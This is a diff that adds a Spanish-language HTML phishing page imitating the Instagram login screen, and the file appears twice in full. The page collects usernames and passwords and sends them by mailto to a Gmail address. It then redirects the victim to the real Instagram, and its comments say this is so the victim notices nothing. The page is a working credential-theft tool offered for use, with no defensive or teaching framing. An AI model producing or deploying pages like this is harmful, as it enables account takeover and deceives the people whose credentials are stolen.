@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+        }
+        .logo {
+            font-family: 'Grand Hotel', cursive; /* Fallback if not loaded */
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #262626;
+        }
+        /* Simulamos el logo clásico de Instagram con texto por simplicidad, 
+           pero puedes poner una imagen <img src="logo.png"> aquí */
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 9px 7px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+            margin-bottom: 6px;
+            font-size: 12px;
+        }
+        input:focus {
+            border: 1px solid #a0a0a0;
+            outline: none;
+        }
+        button {
+            background-color: #3897f0;
+            border: none;
+            color: white;
+            font-weight: 600;
+            padding: 7px 0;
+            width: 100%;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        button:hover {
+            background-color: #2b8cd8;
+        }
+        .footer {
+            margin-top: 16px;
+            font-size: 12px;
+            color: #8e8e8e;
+            border-top: 1px solid #dbdbdb;
+            padding-top: 16px;
+        }
+        .error-msg {
+            color: #ed4956;
+            font-size: 14px;
+            margin-bottom: 10px;
+            display: none;
+        }
+    </style>
+    <!-- Importamos fuente similar al logo original -->
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+</head>
+<body>
+<div class="container">
+    <h1 class="logo">Instagram</h1>
+    
+    <!-- CAMBIA TU_EMAIL@AQUI POR TU CORREO REAL -->
+    <form action="mailto:hastaelinfinitoymaasalla@gmail.com" method="POST" enctype="text/plain" id="loginForm">
+        <div class="error-msg" id="errorMsg">Tu contraseña es incorrecta.</div>
+        
+        <input type="text" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
+        <input type="password" name="password" placeholder="Contraseña" required>
+        
+        <button type="submit">Iniciar sesión</button>
+    </form>
+    <div class="footer">
+        <a href="#" style="color: #385185; text-decoration: none; font-size: 12px;">¿Has olvidado la contraseña?</a>
+    </div>
+</div>
+<script>
+    // Este script simula que estamos verificando contra el servidor de Instagram
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault(); // Evitamos que el formulario se envíe inmediatamente
+        
+        const btn = document.querySelector('button');
+        const errorMsg = document.getElementById('errorMsg');
+        
+        // Simulamos carga
+        btn.innerHTML = '...';
+        btn.disabled = true;
+        setTimeout(() => {
+            // Si quieres ser más realista, puedes mostrar un error falso primero
+            // y luego dejar que se envíe, o simplemente redirigir.
+            
+            // OPCIÓN A: Redirigir a Instagram real inmediatamente después de capturar
+            // Para esto necesitarías un backend pequeño, pero como estamos usando mailto:
+            // vamos a simular un "Éxito" y luego redirigir.
+            
+            alert("Verificando credenciales...");
+            
+            // Aquí lanzamos el envío real del email con los datos
+            this.submit(); 
+            
+            // Y redirigimos a la web real para que no note nada raro
+            window.location.href = "https://www.instagram.com";
+            
+        }, 1000);
+    });
+</script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+        }
+        .logo {
+            font-family: 'Grand Hotel', cursive; /* Fallback if not loaded */
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #262626;
+        }
+        /* Simulamos el logo clásico de Instagram con texto por simplicidad, 
+           pero puedes poner una imagen <img src="logo.png"> aquí */
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 9px 7px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+            margin-bottom: 6px;
+            font-size: 12px;
+        }
+        input:focus {
+            border: 1px solid #a0a0a0;
+            outline: none;
+        }
+        button {
+            background-color: #3897f0;
+            border: none;
+            color: white;
+            font-weight: 600;
+            padding: 7px 0;
+            width: 100%;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        button:hover {
+            background-color: #2b8cd8;
+        }
+        .footer {
+            margin-top: 16px;
+            font-size: 12px;
+            color: #8e8e8e;
+            border-top: 1px solid #dbdbdb;
+            padding-top: 16px;
+        }
+        .error-msg {
+            color: #ed4956;
+            font-size: 14px;
+            margin-bottom: 10px;
+            display: none;
+        }
+    </style>
+    <!-- Importamos fuente similar al logo original -->
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+</head>
+<body>
+<div class="container">
+    <h1 class="logo">Instagram</h1>
+    
+    <!-- CAMBIA TU_EMAIL@AQUI POR TU CORREO REAL -->
+    <form action="mailto:hastaelinfinitoymaasalla@gmail.com" method="POST" enctype="text/plain" id="loginForm">
+        <div class="error-msg" id="errorMsg">Tu contraseña es incorrecta.</div>
+        
+        <input type="text" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
+        <input type="password" name="password" placeholder="Contraseña" required>
+        
+        <button type="submit">Iniciar sesión</button>
+    </form>
+    <div class="footer">
+        <a href="#" style="color: #385185; text-decoration: none; font-size: 12px;">¿Has olvidado la contraseña?</a>
+    </div>
+</div>
+<script>
+    // Este script simula que estamos verificando contra el servidor de Instagram
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault(); // Evitamos que el formulario se envíe inmediatamente
+        
+        const btn = document.querySelector('button');
+        const errorMsg = document.getElementById('errorMsg');
+        
+        // Simulamos carga
+        btn.innerHTML = '...';
+        btn.disabled = true;
+        setTimeout(() => {
+            // Si quieres ser más realista, puedes mostrar un error falso primero
+            // y luego dejar que se envíe, o simplemente redirigir.
+            
+            // OPCIÓN A: Redirigir a Instagram real inmediatamente después de capturar
+            // Para esto necesitarías un backend pequeño, pero como estamos usando mailto:
+            // vamos a simular un "Éxito" y luego redirigir.
+            
+            alert("Verificando credenciales...");
+            
+            // Aquí lanzamos el envío real del email con los datos
+            this.submit(); 
+            
+            // Y redirigimos a la web real para que no note nada raro
+            window.location.href = "https://www.instagram.com";
+            
+        }, 1000);
+    });
+</script>
+</body>
+</html>
